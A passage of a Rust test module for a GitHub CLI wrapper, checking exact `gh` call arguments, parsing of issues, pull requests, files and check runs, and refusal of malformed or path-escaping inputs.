            "2026-1-04T10:13:16Z",
            "",
            "2026-10-04T10:13:1٦Z",
        ] {
            assert!(!is_utc_second(bad), "{bad}");
        }
    }

    #[test]
    fn a_graphql_call_for_a_repo_that_is_not_owner_name_is_a_parse_error() {
        assert_eq!(
            issue_query_args("softfac", "query", 6)
                .unwrap_err()
                .to_string(),
            "`gh api graphql` returned unexpected output: a repo written as owner/name, got `softfac`"
        );
        assert_eq!(
            issue_query_args("rawphp/softfac", "q", 6).unwrap(),
            args(&[
                "api",
                "graphql",
                "-f",
                "query=q",
                "-f",
                "owner=rawphp",
                "-f",
                "name=softfac",
                "-F",
                "number=6"
            ])
        );
    }

    // ----- Part A tests -----

    const REPO: &str = "rawphp/softfac";
    const BASE_SHA: &str = "9f8e7d6c5b4a39281706f5e4d3c2b1a098765432";
    const FILE_SHA: &str = BASE_SHA;
    const CONFIG_TEXT: &str = "factory:\n  instructors: [tomkaczocha]\n  base: main\n";
    const CONFIG_B64: &str =
        "ZmFjdG9yeToKICBpbnN0cnVjdG9yczogW3RvbWthY3pvY2hhXQogIGJhc2U6IG1haW4K\n";
    const HEAD_SHA: &str = "4f1c2d3e4a5b60718293a4b5c6d7e8f901234567";

    fn is_parse(error: &TrackerError) -> bool {
        matches!(error, TrackerError::Other(m) if m.contains("returned unexpected output"))
    }

    fn is_refused(error: &TrackerError) -> bool {
        matches!(error, TrackerError::Other(m)
            if m.contains("before calling gh") && !m.contains("unexpected output"))
    }

    fn is_failed(error: &TrackerError) -> bool {
        matches!(error, TrackerError::Other(m) if m.contains("exited with status"))
    }

    fn ref_reply(sha: &str) -> String {
        format!(
            "{{\"ref\":\"refs/heads/main\",\"node_id\":\"REF_x\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/refs/heads/main\",\"object\":{{\"sha\":\"{sha}\",\"type\":\"commit\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/commits/{sha}\"}}}}"
        )
    }

    fn file_reply(kind: &str, encoding: &str, size: u64, content: &str) -> String {
        serde_json::json!({
            "name": "config.yml",
            "path": ".dw/config.yml",
            "sha": "abc",
            "size": size,
            "url": "https://api.github.com/repos/rawphp/softfac/contents/.dw/config.yml?ref=main",
            "type": kind,
            "content": content,
            "encoding": encoding,
            "_links": {"self": "x"},
        })
        .to_string()
    }

    fn encode_base64(bytes: &[u8]) -> String {
        const TABLE: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in bytes.chunks(3) {
            let n = chunk
                .iter()
                .enumerate()
                .fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
            for i in 0..4 {
                if i <= chunk.len() {
                    out.push(TABLE[((n >> (18 - 6 * i)) & 63) as usize] as char);
                } else {
                    out.push('=');
                }
            }
        }
        out
    }

    #[test]
    fn branch_tip_reads_the_full_commit_id_of_the_branch_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), BASE_SHA);
        assert_eq!(
            fake.calls(),
            vec![args(&["api", "repos/rawphp/softfac/git/ref/heads/main"])]
        );
    }

    #[test]
    fn branch_tip_keeps_slashes_in_the_branch_and_encodes_everything_else() {
        let fake = FakeTracker::answering([
            Answer::ok(ref_reply(BASE_SHA)),
            Answer::ok(ref_reply(BASE_SHA)),
        ]);
        branch_tip(&fake, REPO, "release/1.0").unwrap();
        branch_tip(&fake, REPO, "a b?c#d%e").unwrap();
        let calls = fake.calls();
        assert_eq!(
            calls[0][1],
            "repos/rawphp/softfac/git/ref/heads/release/1.0"
        );
        assert_eq!(
            calls[1][1],
            "repos/rawphp/softfac/git/ref/heads/a%20b%3Fc%23d%25e"
        );
    }

    #[test]
    fn branch_tip_refuses_an_answer_that_is_not_a_commit_id_or_not_a_commit() {
        let tag = ref_reply(&BASE_SHA.to_uppercase()).replace("commit", "tag");
        for answer in [
            ref_reply("main"),
            ref_reply("9f8e7d6c5b4a3928"),
            tag,
            "{\"object\":{\"type\":\"commit\"}}".to_string(),
            "[]".to_string(),
            "not json".to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
            let error = branch_tip(&fake, REPO, "main").unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn branch_tip_accepts_a_64_digit_id() {
        let sha = "a".repeat(64);
        let fake = FakeTracker::answering([Answer::ok(ref_reply(&sha))]);
        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), sha);
    }

    #[test]
    fn branch_tip_refuses_a_branch_name_that_could_leave_the_refs_path_with_no_call() {
        for branch in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
            let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
            let error = branch_tip(&fake, REPO, branch).unwrap_err();
            assert!(is_refused(&error), "{branch}: {error}");
            assert!(fake.calls().is_empty(), "{branch}");
        }
    }

    #[test]
    fn branch_tip_of_a_branch_that_is_not_there_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = branch_tip(&fake, REPO, "gone").unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    #[test]
    fn default_branch_reads_the_repo_from_the_api_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(
            "{\"id\":1,\"name\":\"softfac\",\"full_name\":\"rawphp/softfac\",\"default_branch\":\"main\",\"private\":true}",
        )]);
        assert_eq!(default_branch(&fake, REPO).unwrap(), "main");
        assert_eq!(fake.calls(), vec![args(&["api", "repos/rawphp/softfac"])]);
    }

    #[test]
    fn default_branch_refuses_an_answer_without_one() {
        for answer in [
            "{\"name\":\"softfac\"}",
            "{\"default_branch\":\"\"}",
            "{\"default_branch\":null}",
            "[]",
            "no",
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = default_branch(&fake, REPO).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn file_at_reads_a_file_at_a_commit_with_the_exact_call_and_decodes_it() {
        let fake =
            FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
        assert_eq!(
            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
            CONFIG_TEXT
        );
        assert_eq!(
            fake.calls(),
            vec![args(&[
                "api",
                &format!("repos/rawphp/softfac/contents/.dw/config.yml?ref={FILE_SHA}")
            ])]
        );
    }

    #[test]
    fn file_at_decodes_content_wrapped_over_several_lines_and_padded() {
        let b64 = "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh\nYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQo=\n";
        let fake = FakeTracker::answering([Answer::ok(file_reply("file", "base64", 101, b64))]);
        assert_eq!(
            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
            format!("{}\n", "a".repeat(100))
        );
    }

    #[test]
    fn file_at_refuses_a_file_over_the_size_cap_even_when_its_content_is_whole() {
        // The size check must refuse it on its own: the content matches the stated size.
        let size = MAX_FILE_BYTES + 1;
        let content = encode_base64("a".repeat(size as usize).as_bytes());
        let fake =
            FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, &content))]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(is_parse(&error), "{error}");
        assert!(error.to_string().contains("it is too big"), "{error}");
    }

    #[test]
    fn file_at_refuses_what_is_not_a_plain_complete_file() {
        for answer in [
            // A directory is a JSON array.
            "[{\"type\":\"file\",\"name\":\"config.yml\"}]".to_string(),
            file_reply("symlink", "base64", 51, CONFIG_B64),
            file_reply("submodule", "base64", 51, CONFIG_B64),
            // A file over 1 MB comes with no content and the encoding `none`.
            file_reply("file", "none", 2_000_000, ""),
            // Under the size cap, but the content is not base64 even though it reads like it.
            file_reply("file", "none", 51, CONFIG_B64),
            file_reply("file", "utf-8", 51, CONFIG_B64),
            // The size says more than the content holds: truncated.
            file_reply("file", "base64", 5_000, CONFIG_B64),
            file_reply("file", "base64", 10, CONFIG_B64),
            // Over the size this reader accepts, whatever the content says.
            file_reply("file", "base64", MAX_FILE_BYTES + 1, CONFIG_B64),
            // Not base64, not UTF-8.
            file_reply("file", "base64", 51, "!!!not base64!!!"),
            file_reply("file", "base64", 3, "//4K\n"),
            "not json".to_string(),
        ] {
            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn file_at_refuses_base64_whose_padding_does_not_fit_its_length() {
        // `YQ==` is "a" and `YWI=` is "ab". One `=` after two characters, or two after three,
        // is not base64.
        for (b64, size) in [("YQ=", 1), ("YWI==", 2), ("YQ", 1), ("YQ==YQ==", 2)] {
            let fake =
                FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, b64))]);
            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
            assert!(is_parse(&error), "{b64}: {error}");
        }
        for (b64, want) in [("YQ==", "a"), ("YWI=", "ab")] {
            let fake = FakeTracker::answering([Answer::ok(file_reply(
                "file",
                "base64",
                want.len() as u64,
                b64,
            ))]);
            assert_eq!(
                file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
                want
            );
        }
    }

    #[test]
    fn file_at_makes_no_call_for_a_ref_that_is_not_a_full_commit_id_or_a_path_that_could_leave() {
        for (path, sha) in [
            (".dw/config.yml", "main"),
            (".dw/config.yml", "9f8e7d6c"),
            (".dw/config.yml", "9f8e7d6c5b4a39281706f5e4d3c2b1a09876543g"),
            ("../x", FILE_SHA),
            ("a//b", FILE_SHA),
            ("", FILE_SHA),
            ("a b", FILE_SHA),
            ("a?ref=main", FILE_SHA),
        ] {
            let fake =
                FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
            let error = file_at(&fake, REPO, path, sha).unwrap_err();
            assert!(is_refused(&error), "{path} {sha}: {error}");
            assert!(fake.calls().is_empty(), "{path} {sha}");
        }
    }

    #[test]
    fn file_at_of_a_file_that_is_not_there_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    // The listings and one issue.

    const LIST_ONE: &str = "[{\"assignees\":[{\"id\":\"MDQ6VXNlcjE=\",\"login\":\"rawphp\",\"name\":\"Tom\"}],\"labels\":[{\"id\":\"LA_1\",\"name\":\"factory:needs-info\",\"description\":\"d\",\"color\":\"d93f0b\"}],\"number\":6,\"title\":\"GitHub client\"}]";
    const LIST_MANY: &str = "[{\"assignees\":[],\"labels\":[],\"number\":6,\"title\":\"GitHub client\"},{\"assignees\":[{\"login\":\"a\"},{\"login\":\"b\"}],\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"Postponed\"}],\"number\":9,\"title\":\"Daemon loop\"}]";
    const ISSUE_VIEW: &str = "{\"assignees\":[{\"login\":\"rawphp\"}],\"author\":{\"id\":\"MDQ6VXNlcjE=\",\"is_bot\":false,\"login\":\"tomkaczocha\",\"name\":\"Tom\"},\"body\":\"Build the runner.\\n\\n- one\\n- two\",\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"phase:1\"}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}";

    fn listing_of(count: u64) -> String {
        let rows: Vec<String> = (1..=count)
            .rev()
            .map(|n| {
                format!("{{\"assignees\":[],\"labels\":[],\"number\":{n},\"title\":\"issue {n}\"}}")
            })
            .collect();
        format!("[{}]", rows.join(","))
    }

    fn issue_json(labels: &[&str], assignees: &[&str], body: &str) -> String {
        let assignees: Vec<String> = assignees
            .iter()
            .map(|n| format!("{{\"login\":\"{n}\"}}"))
            .collect();
        let labels: Vec<String> = labels
            .iter()
            .map(|n| format!("{{\"name\":\"{n}\"}}"))
            .collect();
        format!(
            "{{\"assignees\":[{}],\"author\":null,\"body\":{body},\"labels\":[{}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}}",
            assignees.join(","),
            labels.join(",")
        )
    }

    fn issue_view_call(number: &str) -> Vec<String> {
        args(&[
            "issue",
            "view",
            number,
            "--repo",
            REPO,
            "--json",
            "number,title,body,labels,assignees,state,author",
        ])
    }

    #[test]
    fn list_issues_with_none() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert_eq!(
            issues,
            Listing {
                items: vec![],
                cut: false
            }
        );
        assert_eq!(
            fake.calls(),
            vec![args(&[
                "issue",
                "list",
                "--repo",
                REPO,
                "--state",
                "open",
                "--label",
                "factory:ready",
                "--limit",
                "201",
                "--json",
                "number,title,assignees,labels",
            ])]
        );
    }

    #[test]
    fn list_issues_with_one_ignores_unknown_fields() {
        let fake = FakeTracker::answering([Answer::ok(LIST_ONE)]);
        let issues = list_issues(&fake, REPO, State::NeedsInfo).unwrap();
        assert_eq!(
            issues.items,
            vec![IssueSummary {
                number: 6,
                title: "GitHub client".into(),
                assignees: vec!["rawphp".into()],
                labels: vec!["factory:needs-info".into()],
            }]
        );
        assert_eq!(fake.calls()[0][7], "factory:needs-info");
    }

    #[test]
    fn list_issues_with_several_carries_each_ones_label_names_or_none() {
        let fake = FakeTracker::answering([Answer::ok(LIST_MANY)]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert_eq!(
            issues.items,
            vec![
                IssueSummary {
                    number: 6,
                    title: "GitHub client".into(),
                    assignees: vec![],
                    labels: vec![],
                },
                IssueSummary {
                    number: 9,
                    title: "Daemon loop".into(),
                    assignees: vec!["a".into(), "b".into()],
                    labels: vec!["factory:ready".into(), "Postponed".into()],
                },
            ]
        );
    }

    #[test]
    fn list_issues_past_the_limit_returns_the_first_200_and_says_it_was_cut() {
        assert_eq!(LIST_LIMIT, 200);
        let fake = FakeTracker::answering([Answer::ok(listing_of(201))]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert!(issues.cut);
        assert_eq!(issues.items.len(), 200);
        assert_eq!(
            issues.items.iter().map(|i| i.number).collect::<Vec<_>>(),
            (2..=201).rev().collect::<Vec<u64>>()
        );
        assert_eq!(fake.calls()[0][9], "201");
    }

    #[test]
    fn list_issues_at_the_limit_returns_them_all_and_says_nothing() {
        let fake = FakeTracker::answering([Answer::ok(listing_of(200))]);
        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
        assert!(!issues.cut);
        assert_eq!(issues.items.len(), 200);
    }

    #[test]
    fn malformed_json_is_a_parse_error_carrying_the_args() {
        let fake = FakeTracker::answering([Answer::ok("not json")]);
        let error = list_issues(&fake, REPO, State::Ready).unwrap_err();
        let message = error.to_string();
        assert!(is_parse(&error), "{message}");
        assert!(message.contains("JSON array of issues"), "{message}");
        assert!(message.contains("unexpected output"), "{message}");
        assert!(
            message.contains("gh issue list --repo rawphp/softfac"),
            "{message}"
        );
    }

    #[test]
    fn issue_reads_the_real_shape_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(ISSUE_VIEW)]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(fake.calls(), vec![issue_view_call("10")]);
        assert_eq!(
            detail,
            IssueDetail {
                number: 10,
                title: "Build step".into(),
                body: "Build the runner.\n\n- one\n- two".into(),
                labels: vec!["factory:ready".into(), "phase:1".into()],
                assignees: vec!["rawphp".into()],
                author: Some("tomkaczocha".into()),
                state: Some(State::Ready),
                closed: false,
            }
        );
    }

    #[test]
    fn issue_says_when_github_has_it_closed_and_keeps_its_factory_label() {
        let fake = FakeTracker::answering([Answer::ok(
            ISSUE_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
        )]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert!(detail.closed);
        assert_eq!(detail.state, Some(State::Ready));
    }

    #[test]
    fn issue_author_is_null_when_gh_gives_null_or_nothing() {
        let without_author = {
            let start = ISSUE_VIEW.find("\"author\":{").unwrap();
            let end = start + ISSUE_VIEW[start..].find("},").unwrap() + 2;
            format!("{}{}", &ISSUE_VIEW[..start], &ISSUE_VIEW[end..])
        };
        let fake = FakeTracker::answering([
            Answer::ok(issue_json(&[], &[], "\"b\"")),
            Answer::ok(without_author),
        ]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
    }

    #[test]
    fn issue_state_is_null_with_no_factory_label() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["phase:1", "bug"], &[], "\"b\""))]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(detail.state, None);
        assert!(detail.assignees.is_empty());
    }

    #[test]
    fn issue_state_is_the_one_factory_label() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["bug", "factory:needs-info"],
            &[],
            "\"b\"",
        ))]);
        assert_eq!(
            issue(&fake, REPO, 10).unwrap().state,
            Some(State::NeedsInfo)
        );
    }

    #[test]
    fn issue_state_is_null_with_two_factory_labels() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["factory:ready", "factory:building"],
            &[],
            "\"b\"",
        ))]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
    }

    #[test]
    fn issue_state_is_null_for_an_unknown_factory_label() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["factory:bogus"], &[], "\"b\""))]);
        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
    }

    #[test]
    fn issue_state_is_null_with_a_bogus_and_a_real_factory_label_in_either_order() {
        for labels in [
            ["factory:bogus", "factory:ready"],
            ["factory:ready", "factory:bogus"],
        ] {
            let fake = FakeTracker::answering([Answer::ok(issue_json(&labels, &[], "\"b\""))]);
            assert_eq!(issue(&fake, REPO, 10).unwrap().state, None, "{labels:?}");
        }
    }

    #[test]
    fn issue_with_a_null_body_has_an_empty_body_and_keeps_every_assignee() {
        let fake = FakeTracker::answering([Answer::ok(issue_json(
            &["factory:ready"],
            &["a", "b"],
            "null",
        ))]);
        let detail = issue(&fake, REPO, 10).unwrap();
        assert_eq!(detail.body, "");
        assert_eq!(detail.assignees, vec!["a".to_string(), "b".to_string()]);
    }

    #[test]
    fn issue_errors_are_typed() {
        let failing = FakeTracker::answering([Answer::fail(1, "not found")]);
        let failed = issue(&failing, REPO, 10).unwrap_err();
        assert!(is_failed(&failed), "{failed}");
        assert!(failed.to_string().contains("status 1"), "{failed}");

        let wrong = FakeTracker::answering([Answer::ok("[]")]);
        assert!(is_parse(&issue(&wrong, REPO, 10).unwrap_err()));

        let null_assignees = FakeTracker::answering([Answer::ok("{\"assignees\":null}")]);
        assert!(is_parse(&issue(&null_assignees, REPO, 10).unwrap_err()));
    }

    #[test]
    fn issue_uses_the_number_it_is_given() {
        let fake =
            FakeTracker::answering([Answer::ok(issue_json(&["factory:ready"], &[], "\"b\""))]);
        issue(&fake, REPO, 7).unwrap();
        assert_eq!(fake.calls()[0][..3], args(&["issue", "view", "7"])[..]);
    }

    // Pull requests.

    const PR_VIEW: &str = "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"t3code/2bb65018\",\"headRefOid\":\"4f1c2d3e4a5b60718293a4b5c6d7e8f901234567\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":2,\"state\":\"OPEN\"}";

    fn pr_view(state: &str, draft: bool) -> String {
        format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":false,\"isDraft\":{draft},\"mergeable\":\"MERGEABLE\",\"number\":9,\"state\":\"{state}\"}}"
        )
    }

    fn pr_view_call(number: &str) -> Vec<String> {
        args(&[
            "pr",
            "view",
            number,
            "--repo",
            REPO,
            "--json",
            "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt",
        ])
    }

    #[test]
    fn pull_request_reads_the_real_shape_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(PR_VIEW)]);
        let pr = pull_request(&fake, REPO, 2).unwrap();
        assert_eq!(fake.calls(), vec![pr_view_call("2")]);
        assert_eq!(
            pr,
            Some(PullRequest {
                number: 2,
                is_draft: true,
                open: true,
                merged: false,
                head_ref: "t3code/2bb65018".into(),
                cross_repository: false,
                base_ref: "main".into(),
                head_sha: HEAD_SHA.into(),
                mergeable: Mergeable::Mergeable,
                created_at: "2026-10-29T05:50:00Z".into(),
            })
        );
    }

    #[test]
    fn pull_request_reads_githubs_mergeable_state_and_anything_else_as_unknown() {
        for (raw, mergeable) in [
            ("MERGEABLE", Mergeable::Mergeable),
            ("CONFLICTING", Mergeable::Conflicting),
            ("UNKNOWN", Mergeable::Unknown),
            ("SOMETHING_NEW", Mergeable::Unknown),
        ] {
            let fake = FakeTracker::answering([Answer::ok(
                PR_VIEW.replace("\"MERGEABLE\"", &format!("\"{raw}\"")),
            )]);
            let pr = pull_request(&fake, REPO, 2).unwrap().unwrap();
            assert_eq!(fake.calls(), vec![pr_view_call("2")], "{raw}");
            assert_eq!(pr.mergeable, mergeable, "{raw}");
        }
    }

    #[test]
    fn pull_request_says_when_it_is_merged_and_is_then_not_open() {
        let merged = FakeTracker::answering([Answer::ok(
            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"MERGED\""),
        )]);
        let pr = pull_request(&merged, REPO, 2).unwrap().unwrap();
        assert!(pr.merged);
        assert!(!pr.open);
        let closed = FakeTracker::answering([Answer::ok(
            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
        )]);
        let other = pull_request(&closed, REPO, 2).unwrap().unwrap();
        assert!(!other.merged);
        assert!(!other.open);
    }

    #[test]
    fn pull_request_from_a_fork_and_into_another_base_says_so() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"release/1.0\",\"headRefName\":\"t3code/x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":true,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":4,\"state\":\"OPEN\"}}"
        ))]);
        let pr = pull_request(&fake, REPO, 4).unwrap().unwrap();
        assert!(pr.cross_repository);
        assert_eq!(pr.base_ref, "release/1.0");
        assert_eq!(pr.head_ref, "t3code/x");
    }

    #[test]
    fn a_pull_request_view_without_the_fork_or_base_fields_is_a_parse_error() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
        ))]);
        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
    }

    #[test]
    fn a_pull_request_view_without_the_head_commit_is_a_parse_error() {
        let fake = FakeTracker::answering([Answer::ok(
            "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}",
        )]);
        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
    }

    #[test]
    fn pull_request_reads_the_head_commit_as_given() {
        let sha = "0123456789abcdef0123456789abcdef01234567";
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{sha}\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
        ))]);
        assert_eq!(pull_request(&fake, REPO, 3).unwrap().unwrap().head_sha, sha);
    }

    #[test]
    fn a_pull_request_whose_creation_time_is_not_a_utc_second_is_a_parse_error() {
        for at in [
            "",
            "2026-10-29T05:50:00+10:00",
            "2026-10-29T05:50:00.5Z",
            "yesterday",
        ] {
            let fake =
                FakeTracker::answering([Answer::ok(PR_VIEW.replace("2026-10-29T05:50:00Z", at))]);
            let error = pull_request(&fake, REPO, 2).unwrap_err();
            assert!(is_parse(&error), "{at}: {error}");
        }
    }

    #[test]
    fn a_pull_request_whose_head_commit_is_not_a_full_id_is_a_parse_error() {
        for sha in [
            String::new(),
            "4f1c2d3".to_string(),
            format!("{HEAD_SHA}0"),
            HEAD_SHA.replace('4', "g"),
        ] {
            let fake = FakeTracker::answering([Answer::ok(PR_VIEW.replace(HEAD_SHA, &sha))]);
            let error = pull_request(&fake, REPO, 2).unwrap_err();
            assert!(is_parse(&error), "{sha}: {error}");
        }
    }

    #[test]
    fn pull_request_merged_and_closed_are_not_open() {
        for state in ["MERGED", "CLOSED"] {
            let fake = FakeTracker::answering([Answer::ok(pr_view(state, false))]);
            let pr = pull_request(&fake, REPO, 9).unwrap().unwrap();
            assert!(!pr.open, "{state}");
            assert!(!pr.is_draft, "{state}");
        }
    }

    #[test]
    fn a_pull_request_that_does_not_exist_is_null() {
        for stderr in [
            "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)\n",
            "graphql: could not resolve to a pullrequest with the number of 999.",
            "GRAPHQL: COULD NOT RESOLVE TO A PULLREQUEST",
        ] {
            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
            assert_eq!(pull_request(&fake, REPO, 999).unwrap(), None, "{stderr}");
        }
    }

    #[test]
    fn any_other_pull_request_failure_stays_an_error() {
        for stderr in [
            "HTTP 502: Bad Gateway",
            "Could not resolve host: api.github.com",
            "Could not resolve to an Issue with the number of 5.",
            "",
        ] {
            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
            let error = pull_request(&fake, REPO, 999).unwrap_err();
            assert!(is_failed(&error), "{stderr}: {error}");
            assert!(error.to_string().contains("status 1"), "{stderr}: {error}");
        }
        let fake = FakeTracker::new();
        let error = pull_request(&fake, REPO, 999).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("cannot start")),
            "{error}"
        );
    }

    #[test]
    fn pull_request_errors_are_typed() {
        let failed = FakeTracker::answering([Answer::fail(1, "no pull requests found")]);
        assert!(is_failed(&pull_request(&failed, REPO, 2).unwrap_err()));
        let parse = FakeTracker::answering([Answer::ok("{}")]);
        assert!(is_parse(&pull_request(&parse, REPO, 2).unwrap_err()));
    }

    #[test]
    fn issue_and_pull_request_calls_use_the_number_they_are_given() {
        let fake = FakeTracker::answering([
            Answer::ok(issue_json(&["factory:ready"], &[], "\"b\"")),
            Answer::ok(pr_view("OPEN", true)),
        ]);
        issue(&fake, REPO, 7).unwrap();
        pull_request(&fake, REPO, 3).unwrap();
        assert_eq!(fake.calls(), vec![issue_view_call("7"), pr_view_call("3")]);
    }

    // Checks.

    fn run(name: &str, status: &str, conclusion: Option<&str>) -> serde_json::Value {
        serde_json::json!({
            "id": 1,
            "name": name,
            "status": status,
            "conclusion": conclusion,
            "html_url": format!("https://github.com/rawphp/softfac/actions/runs/1/job/{name}"),
            "app": {"slug": "github-actions"},
        })
    }

    fn with_url(mut run: serde_json::Value, url: serde_json::Value) -> serde_json::Value {
        run["html_url"] = url;
        run
    }

    fn page(runs: &[serde_json::Value]) -> String {
        serde_json::Value::Array(runs.to_vec()).to_string()
    }

    fn checks_call() -> Vec<String> {
        args(&[
            "api",
            &format!(
                "repos/rawphp/softfac/commits/{BASE_SHA}/check-runs?per_page=100&filter=latest"
            ),
            "--paginate",
            "--jq",
            "[.check_runs[] | {name, status, conclusion, html_url}]",
        ])
    }

    fn names(names: &[&str]) -> Vec<String> {
        args(names)
    }

    /// The one check `gate` over `runs`.
    fn gate(runs: &[serde_json::Value]) -> CheckStatus {
        let fake = FakeTracker::answering([Answer::ok(page(runs))]);
        checks(&fake, REPO, BASE_SHA, &names(&["gate"]))
            .unwrap()
            .remove(0)
    }

    #[test]
    fn checks_reads_the_check_runs_of_the_commit_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(page(&[run(
            "gate",
            "completed",
            Some("success"),
        )]))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
        assert_eq!(fake.calls(), vec![checks_call()]);
        assert_eq!(
            got,
            vec![CheckStatus {
                name: "gate".into(),
                state: CheckState::Passed,
                conclusion: "success".into(),
                url: Some("https://github.com/rawphp/softfac/actions/runs/1/job/gate".into()),
            }]
        );
    }

    #[test]
    fn checks_answers_for_each_name_asked_in_the_order_asked_and_ignores_other_runs() {
        let fake = FakeTracker::answering([Answer::ok(page(&[
            run("lint", "completed", Some("success")),
            run("other", "completed", Some("failure")),
            run("gate", "completed", Some("success")),
        ]))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
        assert_eq!(
            got.iter()
                .map(|c| (c.name.as_str(), c.state))
                .collect::<Vec<_>>(),
            vec![("gate", CheckState::Passed), ("lint", CheckState::Passed)]
        );
    }

    #[test]
    fn a_completed_run_passes_on_success_and_neutral_and_fails_on_anything_else() {
        for conclusion in ["success", "neutral"] {
            let got = gate(&[run("gate", "completed", Some(conclusion))]);
            assert_eq!(got.state, CheckState::Passed, "{conclusion}");
        }
